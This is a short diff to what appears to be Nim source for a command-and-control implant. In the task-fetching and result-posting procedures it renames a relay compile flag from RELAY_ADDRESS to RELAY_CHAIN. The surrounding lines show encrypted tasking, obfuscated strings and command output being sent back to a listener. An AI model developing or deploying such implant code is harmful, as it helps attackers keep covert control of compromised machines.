@@ -503,7 +503,7 @@ proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
             # Check if the response has the expected "t" key for encrypted task data
             if responseJson.hasKey("t"):
                 # Auto-detect role for debug purposes
-                let myRole = when defined(RELAY_ADDRESS): "RELAY_CLIENT" else: "STANDARD"
+                let myRole = when defined(RELAY_CHAIN): "RELAY_CLIENT" else: "STANDARD"
                 
                 # UNIFIED LAYERED DECRYPTION: XOR → AES for ALL implants
                 when defined verbose:
@@ -566,7 +566,7 @@ proc postCommandResults*(li : Listener, cmdGuid : string, output : string) : voi
     var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
     
     # Auto-detect role for debug purposes
-    let myRole = when defined(RELAY_ADDRESS): "RELAY_CLIENT" else: "STANDARD"
+    let myRole = when defined(RELAY_CHAIN): "RELAY_CLIENT" else: "STANDARD"
     
     # UNIFIED LAYERED ENCRYPTION: AES → XOR for ALL implants
     when defined debug:
